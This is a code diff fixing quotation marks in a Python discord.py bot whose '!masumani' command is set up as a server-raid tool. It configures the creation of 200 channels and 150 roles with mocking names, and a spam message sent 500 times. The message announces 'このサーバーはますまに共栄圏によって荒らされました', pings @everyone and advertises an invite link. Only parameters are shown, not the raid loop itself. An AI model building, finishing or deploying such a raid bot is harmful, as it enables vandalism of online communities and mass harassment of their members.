@@ -13,13 +13,13 @@ intents.message_content = True
 intents.guilds = True
 intents.members = True
 
-bot = commands.Bot(command_prefix=’!’, intents=intents)
+bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
-print(f’{bot.user} としてログインしました’)
-print(f’Bot ID: {bot.user.id}’)
-print(’——’)
+print(f'{bot.user} としてログインしました')
+print(f'Bot ID: {bot.user.id}')
+print('——')
 
 @bot.command()
 async def masumani(ctx):
@@ -29,7 +29,7 @@ channel_name = 'ますまに共栄圏最強'
 channel_count = 200
 spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
 spam_count = 500
-role_name = 'ますまに共栄圏に荒らされましたww’
+role_name = 'ますまに共栄圏に荒らされましたww'
 role_count = 150
 
 ```
